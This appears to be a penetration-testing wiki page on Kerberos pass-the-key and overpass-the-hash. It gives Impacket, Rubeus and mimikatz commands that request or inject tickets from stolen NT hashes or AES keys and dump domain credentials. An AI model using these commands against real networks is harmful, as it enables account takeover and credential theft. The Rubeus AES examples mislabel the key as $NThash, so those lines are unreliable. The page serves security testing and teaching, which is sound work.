# Pass the key

## Theory

The Kerberos authentication protocol works with tickets in order to grant access. A Service Ticket (ST) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](asreproast.md)).

The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. An attacker knowing that secret key doesn't need knowledge of the actual password to obtain tickets. This is called pass-the-key.

Kerberos offers 4 different key types: DES, RC4, AES-128 and AES-256.

* When the RC4 etype is enabled, the RC4 key can be used. The problem is that the RC4 key is in fact the user's NT hash. Using a an NT hash to obtain Kerberos tickets is called [**overpass the hash**](opth.md).
* When RC4 is disabled, other Kerberos keys (DES, AES-128, AES-256) can be passed as well. This technique is called **pass the key**. In fact, only the name and key used differ between overpass the hash and pass the key, the technique is the same.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getTGT](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) (Python) can request a TGT (Ticket Granting Ticket) given a password, hash (`LMhash` can be empty), or aesKey. The TGT will be saved as a `.ccache` file that can then be used by other Impacket scripts.

```bash
# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

# with an AES (128 or 256 bits) key (pass-the-key)
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
```

Once a TGT is obtained, the tester can use it with the environment variable `KRB5CCNAME` with tools implementing [pass-the-ticket](ptt.md).

An alternative to requesting the TGT and then passing the ticket is using the `-k` option in Impacket scripts. Using that option allows for passing either TGTs or STs. Example below with secretsdump.

```bash
secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
```
{% endtab %}

{% tab title="Windows" %}
On Windows, requesting a TGT can be achieved with [Rubeus](https://github.com/GhostPack/Rubeus) (C#). The ticket will be injected in the session and Windows will natively be able to use these tickets to access given services.

```bash
# with an NT hash
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# with an AES 128 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$NThash /ptt

# with an AES 256 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$NThash /ptt
```

An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz) with [`sekurlsa::pth`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth).

```bash
# with an NT hash
sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt

# with an AES 128 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt

# with an AES 256 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.notso.pro/2020-05-09-offops-in-ad-1/" %}

{% embed url="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash" %}

{% embed url="https://blog.stealthbits.com/how-to-detect-overpass-the-hash-attacks/" %}
